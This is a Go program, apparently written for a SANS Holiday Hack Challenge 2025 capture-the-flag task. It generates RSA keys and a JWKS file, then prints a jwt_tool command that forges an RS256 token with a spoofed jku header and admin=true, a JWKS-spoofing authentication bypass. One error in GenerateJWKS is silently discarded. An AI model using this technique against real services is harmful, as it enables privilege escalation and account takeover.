package main

import (
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	"encoding/base64"
	"encoding/json"
	"encoding/pem"
	"flag"
	"fmt"
	"log"
	"math/big"
	"os"
)

// SANS Holiday Hack Challenge 2025
// https://github.com/ticarpi/jwt_tool/wiki/Using-jwt_tool
// https://www.intigriti.com/researchers/blog/hacking-tools/exploiting-jwt-vulnerabilities#4-jwk-spoofing

type KeyPairStruct struct {
	PrivateKey *rsa.PrivateKey
	PublicKey  *rsa.PublicKey
	JWKS       []byte
}

func (k *KeyPairStruct) GenerateKeys(keysize int) error {
	var err error
	k.PrivateKey, err = rsa.GenerateKey(rand.Reader, keysize)
	if err != nil {
		return fmt.Errorf("failed to generate key: %v", err)
	}

	k.PublicKey = &k.PrivateKey.PublicKey

	return nil

}

func (k *KeyPairStruct) SaveKeys(privateFile string, publicFile string) error {
	// Save private key
	privPEM := &pem.Block{
		Type:  "RSA PRIVATE KEY",
		Bytes: x509.MarshalPKCS1PrivateKey(k.PrivateKey),
	}
	if err := os.WriteFile(privateFile, pem.EncodeToMemory(privPEM), 0600); err != nil {
		return fmt.Errorf("failed to save private key: %v", err)
	}

	pubBytes, err := x509.MarshalPKIXPublicKey(k.PublicKey)
	if err != nil {
		return fmt.Errorf("failed to marshal public key: %v", err)
	}

	pubPEM := &pem.Block{
		Type:  "PUBLIC KEY",
		Bytes: pubBytes,
	}
	if err := os.WriteFile(publicFile, pem.EncodeToMemory(pubPEM), 0644); err != nil {
		return fmt.Errorf("failed to save public key: %v", err)
	}

	return nil
}

func (k *KeyPairStruct) GenerateJWKS() error {
	var err error
	nBytes := k.PrivateKey.N.Bytes()
	eBytes := big.NewInt(int64(k.PublicKey.E)).Bytes()

	// Create JWKS structure
	jwks := map[string]interface{}{
		"keys": []map[string]interface{}{
			{
				"kty": "RSA",
				"kid": "my-key-1",
				"n":   base64.RawURLEncoding.EncodeToString(nBytes),
				"e":   base64.RawURLEncoding.EncodeToString(eBytes),
			},
		},
	}

	// Convert to JSON and print
	k.JWKS, err = json.MarshalIndent(jwks, "", "  ")
	if err != nil {
		fmt.Errorf("failed to marshal JWKS: %v", err)
	}

	return nil
}

func (k *KeyPairStruct) SaveJWKS(jwksFile string) error {
	if err := os.WriteFile(jwksFile, k.JWKS, 0644); err != nil {
		return fmt.Errorf("failed to save jwks file: %v", err)
	}

	return nil
}

func main() {
	var keys KeyPairStruct
	// Command-line flags
	keysize := flag.Int("keysize", 2048, "RSA key size")
	privateFile := flag.String("private", "private.pem", "Private key filename")
	publicFile := flag.String("public", "public.pem", "Public key filename")
	jwksFile := flag.String("jwks", "jwks.json", "JWKS JSON filename")
	flag.Parse()

	fmt.Printf("JWKS Spoofing with jwt_tool - SANS Holiday Hack Challenge 2025\n")
	fmt.Printf("--------------------------------------------------------------------\n")

	// Generate Prive and Public RSA keys with specified key size
	err := keys.GenerateKeys(*keysize)
	if err != nil {
		log.Fatal("failed to generate private key:", err)
	}

	// Save the Private and Public RSA keys to respective files
	err = keys.SaveKeys(*privateFile, *publicFile)
	if err != nil {
		log.Fatal("failed to save private and public keys:", err)
	}

	fmt.Printf("Keys generated successfully!\n")
	fmt.Printf("Private: %s (RSA %d-bit)\n", *privateFile, *keysize)
	fmt.Printf("Public:  %s\n", *publicFile)

	err = keys.GenerateJWKS()
	if err != nil {
		log.Fatal("failed to generate jwks file:", err)
	}

	err = keys.SaveJWKS(*jwksFile)
	if err != nil {
		log.Fatal("failed to save jwks file:", err)
	}

	fmt.Printf("JWKS File created successfully: %s\n", *jwksFile)
	fmt.Printf("Move JWKS File to web folder...\n")

	fmt.Printf("\njwt_tool.py \"\" -I -hc jku -hv \"http://paulweb.neighborhood/%s\" -hc kid -hv my-key-1 -pc admin -pv true -S rs256 -pr %s\n\n", *jwksFile, *privateFile)
}
